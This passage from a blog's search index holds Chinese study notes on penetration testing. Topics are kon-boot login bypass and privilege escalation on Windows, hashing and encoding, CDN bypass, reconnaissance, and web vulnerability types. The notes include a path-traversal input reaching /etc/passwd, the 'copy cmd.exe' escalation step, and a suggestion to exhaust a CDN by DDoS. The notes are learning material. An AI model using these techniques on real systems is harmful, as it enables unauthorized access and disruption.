src="https://img-blog.csdnimg.cn/1991be8564944bfdb9af4d94515aacf0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e31da85ace3f4984a02f178c62b94921.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70/resize,w_700,g_se,x_18#pic_left" alt="在这里插入图片描述"><br>（4）kon-boot还可以进行提权<br>这里只是登陆了一个普通用户，现在想获得管理员权限<br><img src="https://img-blog.csdnimg.cn/06d31f4b24e14041a8bca4b404339c20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>cmd模式输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> <span class="hljs-keyword">c</span>:\windows\system32\cmd.<span class="hljs-keyword">exe</span> cmk.<span class="hljs-keyword">exe</span><br>cmk<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6b6db2e8dbb149a4ba90df8f28d37352.png" alt="在这里插入图片描述"></p><p>获取管理员权限<br><img src="https://img-blog.csdnimg.cn/29025feaf5f1407e8c8b31365049d1bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p> <strong>4. Win10测试kon-boot</strong></p><p><img src="https://img-blog.csdnimg.cn/af3d5d5803db4e5c830e5313f33a16ca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bc2afff7aa5947618914d233c9d4ec7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>启动kon-boot直接系统直接报错，看了这个版本不能绕过win10系统的登陆</p><p> <strong>5. 小结</strong><br>         简单进行了kon-boot对win7和win10的口令绕过，感觉跟PE盘差不多，之前先做过一个PE启动盘，感觉效果要比这个好一点，可以看看我另一篇PE盘的制作。<br>         <a href="https://blog.csdn.net/weixin_52497013/article/details/120711875?spm=1001.2014.3001.5501">PE启动盘制作</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】加密算法（六）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>【小迪安全】加密算法（六）</strong></p><p>常见加密编码等算法解析：MD5、SHA、AES(加密方式：CBC，偏移量、密码key、输出方式为base64和Hex)、Base64、时间戳、进制转换、Unescape。</p><p>MD5：有不可逆型md5，也有16位不可逆md5，多种组合式md5；破解的方法是枚举法，常见的有在线网站：cmd5就是一个md5值库，通过大量的md5进行比对来找出对应md5值的明文。</p><p>Base64：加密字符包括0-9，a-z，A-Z，最后通常会有&#x3D;&#x3D;作为结尾。</p><p>常见加密方式解析：带salt的MD5加密、不同偏移量和密码组合的AES。案例：不同网站的数据库可能会采用不同的加密方式来对用户的口令进行加密，在获取数据库权限时就可以试着破解。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】信息搜集—架构、塔建、WAF等（八）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E6%9E%B6%E6%9E%84%E3%80%81%E5%A1%94%E5%BB%BA%E3%80%81WAF%E7%AD%89%EF%BC%88%E5%85%AB%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E6%9E%B6%E6%9E%84%E3%80%81%E5%A1%94%E5%BB%BA%E3%80%81WAF%E7%AD%89%EF%BC%88%E5%85%AB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>【小迪安全】信息搜集—架构、塔建、WAF等（八）</p><p>知识汇总：（之前要先判断有无CDN，运用第七天CDN绕过知识）有WEB无CDN——关于程序源码（内部&#x2F;未知CMS、开源CMS）、其他（操作系统、塔建平台、数据库类型）、站点塔建（目录站点、端口站点、子域名站点、旁注&#x2F;C段站点、类似域名站点）、防护应用WAF（安全狗{老牌防护软件}、宝塔{自带的防护软件，更偏向于网站搭建这块}、云盾、安骑士）。</p><ul><li><p>CMS识别技术</p></li><li><p>源码获取技术</p></li><li><p>架构信息获取</p></li><li><p>站点搭建分析</p><p>搭建习惯-目录型站点：不同网站有不同目录，不同目录下可能有不同的程序。</p><p>搭建习惯-端口类站点：常规的网站是80端口（也就是HTTP）</p><p>搭建习惯-子域名站点：子域名两套CMS，案例：<a href="http://bbs.goodlift.net/%EF%BC%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95inurl%E3%80%81site">http://bbs.goodlift.net/，搜索语法inurl、site</a></p><p>搭建习惯-类似域名站点：网站后缀.com .net .cn .xyz </p><p>搭建习惯-旁注，C段站点：旁注：同服务器不同站点，C段不同服务器不同站点。</p><p>搭建习惯-搭建软件特征站点：判断是不是塔建软件搭建的网站还是自己搭建网站的方法：抓包观察sever是不是把信息写全，通常来说信息写的越全的网站一般都是使用搭建软件搭建的。</p></li><li><p>WAF防护分析：</p><p>什么是WAF应用？</p><p>如何快速识别WAF？</p><p>识别WAF对于安全测试的意义？</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】信息收集—CDN相关技术(七)</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94CDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94CDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>【小迪安全】信息收集—CDN相关技术</strong></p><p>CDN的概念：CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户<strong>就近</strong>获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。存在CDN技术会对我们的安全测试造成很大的影响。</p><p>常见的CDN绕过技术有哪些？</p><p>子域名查询：不同的域名可以设置的</p><p><a href="http://www.baidu.com、baidu.com/">www.baidu.com、baidu.com</a></p><p><a href="http://www.xiaodi8.com、xiaodi8.com/">www.xiaodi8.com、xiaodi8.com</a></p><p><a href="http://www.xueersi.com、xueersi.com/">www.xueersi.com、xueersi.com</a></p><p>邮件服务查询：邮箱服务器大部分不做CDN，因为邮箱大部分都是内部人访问。这里有一个正向访问和反向访问的区别：正向访问就是我们主动访问该网站，所以服务器就近分配一个IP给我们；方向访问是目标网站发送一个邮件，这时它的IP地址是邮件服务器的IP地址。所以可以根据对方邮件的邮件服务器IP地址来进行测试。（第三方接口扫描不是很靠谱，只有通过人工查询和反复判断才能真正得到真实IP，最后可以通过修改本地的hosts文件来验证是不是真实IP）</p><p>国外地址请求：外国很少访问国内的网站，国外的CDN一般来说不会设置，因为这是从成本角度来考虑的。所以我们可以开个VPN去访问该网站，很有可能获取到该网站的真实IP。</p><p>遗留文件，扫描全网：shodan搜索某网站的遗留文件。</p><p>黑暗引擎搜索特定文件：zoomeye、shodan、fofa、google hacking。案例：shodan搜索网站图片的hash值。</p><p>dns历史记录，以量打量：dns历史记录查询没有设置cdn的时期的真实ip地址。以量打量：ddos（拒绝服务攻击），打光该网站的CDN流量，之后就是真实的IP地址。</p><p>扫描工具：Fuckcdn、w8fuckcdn</p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】信息收集—APP及其他资产（九）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94APP%E7%AD%89%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%EF%BC%88%E4%B9%9D%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94APP%E7%AD%89%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%EF%BC%88%E4%B9%9D%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>【小迪安全】信息收集—APP及其他资产（九）</p><p><strong>这一节是信息收集最重要的一课</strong></p><p>知识要点：</p><p>通过APP获取信息：</p><p>方法：工具反编译获取URL信息或者通过抓包分析数据包。</p><p>APK 一键提取反编译；利用 burp 历史抓更多 URL</p><p><strong>某IP无WEB框架下的测试</strong></p><p>各种端口一顿乱扫-思路 工具：nmap、zoomeye、fofa、shodan</p><p>各种接口一顿乱扫-思路 工具：chinaz、shodan、fofa、zoomeye</p><p>接口部分一顿测试-思路</p><p>案例：某传销网站的信息收集。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】信息收集—资产监控拓展（十）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95%EF%BC%88%E5%8D%81%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95%EF%BC%88%E5%8D%81%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>【小迪安全】信息收集—资产监控拓展（十）</p><p>Github监控结合sever酱微信推送：便于收集最新漏洞信息便于利用。（python脚本）</p><p>各种子域名查询：layer、teemo</p><p>黑暗引擎相关搜索：fofa、shodan、zoomeye</p><p>内部群内部应用内部接口：物理黑客，属于社会工程攻击。</p><p>ip查询工具：</p><p><a href="http://www.ipip.net/">http://www.ipip.net/</a></p><p><a href="https://crt.sh/">https://crt.sh/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】WEB漏洞-必懂知识点（十一）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>【小迪安全】WEB漏洞-必懂知识点（十一）</strong></p><ul><li>WEB漏洞汇总</li></ul><p>​<strong>CSRF:*<em><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，</em>*XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><p>​**SSRF:**SSRF(service side request forgery) 为服务器请求伪造，是一种右攻击者形成服务器端发起的安全漏洞。</p><p>​<strong>目录遍历：</strong>属于一个低危漏洞，具有该漏洞的网站，可以通过windows或者linux下的..&#x2F;遍历网站目录。发现这个漏洞要配合其他的漏洞来继续深入的渗透，比如文件上传漏洞，上传webshell，获取网站权限。</p><p>**文件读取：**如何说目录遍历漏洞是可以看到这个网站目录的所有文件结构而无法读取指定文件获取文件内的信息，那么文件读取漏洞就是针对某个指定文件而获取文件内容信息的漏洞。往往目录遍历漏洞会配合着文件读取漏洞进行，从而获取到重要的文件（网站的数据库配置文件）。</p><p>**文件下载：**通过网站的下载链接的设计漏洞访问下载目标网站中其他目录的文件。</p><p>​<strong>命令执行：</strong></p><p><strong>XXE安全：</strong></p><p>​<strong>其他补充：</strong></p><ul><li>重要漏洞</li></ul><p>​<strong>SQL注入(高危)：</strong>通过测试网站上的注入点获取。SQL注入即是指<a href="https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090?fromModule=lemma_inlink">web应用程序</a>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<a href="https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895?fromModule=lemma_inlink">SQL语句</a>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818?fromModule=lemma_inlink">数据库服务器</a>执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>**文件上传(高危)：**文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。这种漏洞一旦存在就会给网站的安全带了巨大的损害，因为攻击者往往会通过漏洞点上传后门文件，远程控制获取服务器权限。</p><p>**XXS跨站：**XSS攻击通常指的是通过利用<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5/99347?fromModule=lemma_inlink">网页</a>开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>、 <a href="https://baike.baidu.com/item/VBScript/473081?fromModule=lemma_inlink">VBScript</a>、<a href="https://baike.baidu.com/item/ActiveX/529325?fromModule=lemma_inlink">ActiveX</a>、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p>​<strong>文件包含：</strong>文件包含就是为了将写好的代码功能更好的重复使用，用文件包含函数，将写好的功能代码直接引入到另一个代码页中，这样另一个代码页就不需要在写一遍重复的功能性代码。</p><p>​<strong>反序列化：</strong></p><p>序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p><p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p><p>​<strong>代码执行(高危)：</strong></p><p>​<strong>逻辑安全：</strong></p><p>​<strong>未授权访问：</strong></p><p>案例：</p><p>SQL注入（简单）：联合查询</p><p>目录遍历：127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p>文件上传</p><p><a href="http://14.205.40.175/app.znds.com/down/20220930/dbk22gyy_1.9.1.2_dangbei.apk">http://14.205.40.175/app.znds.com/down/20220930/dbk22gyy_1.9.1.2_dangbei.apk</a></p><p><a href="http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMjA5MzAvZGJrMjJneXlfMS45LjEuMl9kYW5nYmVpLmFwaw==">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMjA5MzAvZGJrMjJneXlfMS45LjEuMl9kYW5nYmVpLmFwaw==</a></p><p>L2Rvd24vMjAyMjA5MzAvZGJrMjJneXlfMS45LjEuMl9kYW5nYmVpLmFwaw&#x3D;&#x3D; 使用base64解密后得到：&#x2F;down&#x2F;20220930&#x2F;dbk22gyy_1.9.1.2_dangbei.apk</p><p><a href="http://down.znds.com/getdownurl/?s=">http://down.znds.com/getdownurl/?s=</a></p><p><a href="http://14.205.40.175/app.znds.com/down/20220930/ynjybb_2.8.4_dangbei.apk">http://14.205.40.175/app.znds.com/down/20220930/ynjybb_2.8.4_dangbei.apk</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】信息收集—系统及数据库（五）</title>
    <link href="/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2022/10/10/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>【小迪安全】信息收集—系统及数据库（五）</strong></p><p>知识汇总</p><ul><li>操作系统：windows、linux </li><li>WEB：网站源码（内部或未知、CMS、框架或非框架）</li><li>APP：android、IOS</li><li>第三方：openssh、webblogic、jboss</li></ul><p>如何从网站判断其操作系统类型？</p><p>方法一：在URL位置修改大小写字母，观察网站是否还能正常运行。若能正常运行，则表明该网站的操作系统是windows；若网站不能正常运行，则说明该网站的操作系统是linux。原因是windows系统下对大小写不敏感，而linux系统对大小写敏感。</p><p>方法二：Nmap探测目标操作系统。命令：nmap -O <IP></p><p>方法三：根据ping命令的TTL值判断。</p><p>1、WINDOWS NT&#x2F;2000   TTL：128<br>2、WINDOWS 95&#x2F;98     TTL：32<br>3、UNIX              TTL：255<br>4、LINUX             TTL：64<br>5、WIN7          TTL：64<br>案例：CVE-2017-17010</p><p>如何识别数据库类型？</p><p>方法一：根据数据库框架的类型判断。</p><p>常见数据库类型：</p><p>ASP+Access</p><p>PHP+Mysql</p><p>Python+Mysql&#x2F;mongoDb</p><p>JSP+Oracle</p><p>方法二：根据数据库开放端口，进行端口扫描。</p><p>MySql数据库 ，默认端口是: 3306；</p><p>Oracle数据库 ，默认端口号为：1521；</p><p>Sql Server数据库 ，默认端口号为：1433；</p><p>DB2数据库， 默认端口号为：5000；</p><p>PostgreSQL数据库， 默认端口号为：5432；</p><p>国产的DM达梦数据库， 默认端口号为：5236。</p><p>二、NoSql数据库（非关系型数据库）：<br>Redis数据库，默认端口号：6379；</p><p>Memcached数据库，默认端口号：11211 ；</p><p>MongoDB数据库，默认端口号：27017；</p><p>演示案例：数据库弱口令漏洞-docker-compose CVE-2012-2122(Mysql身份认证绕过漏洞)</p><p><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
